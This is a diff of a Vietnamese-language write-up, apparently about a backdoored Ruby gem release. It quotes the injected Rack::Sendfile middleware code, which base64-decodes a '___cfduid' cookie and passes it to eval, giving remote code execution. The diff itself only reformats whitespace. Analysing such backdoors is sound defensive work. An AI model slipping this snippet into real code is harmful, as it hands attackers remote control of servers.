@@ -12,13 +12,13 @@ Phiên bản chứa backdoor được released do một trong số các authors 
 Đại khái attacker sẽ inject một đoạn mã vào tầng Rack middleware, cụ thể ở đây sẽ là `Rack::Sendfile` middleware.
 
 ```ruby
-def call(env)
-	begin
-		x = Base64.urlsafe_decode64(env['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
-        eval(x) if x
-   	rescue Exception
-    end
-    @app.call(env)
+def call(env)  
+  begin
+    x = Base64.urlsafe_decode64(env['http_cookie'.upcase].scan(/___cfduid=(.+);/).flatten[0].to_s)
+    eval(x) if x
+  rescue Exception
+  end
+  @app.call(env)
 end
 ```
 
